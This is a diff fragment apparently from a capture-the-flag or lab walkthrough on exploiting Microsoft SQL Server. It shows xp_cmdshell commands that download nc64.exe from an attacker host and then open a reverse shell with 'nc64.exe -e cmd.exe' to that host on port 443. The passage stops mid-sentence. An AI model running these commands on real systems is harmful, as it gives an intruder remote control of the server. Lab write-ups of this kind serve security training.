@@ -116,9 +116,12 @@ SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IP/nc
 
 Verify if  the simple Python HTTP server recibed the request
 
-Now bind the `cmd.exe`
+> Execute Reverse Shell
+```sql
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe @IP 443"
+```
 
-
+Now look bac to the listener to confirme that re
 
 ---
 
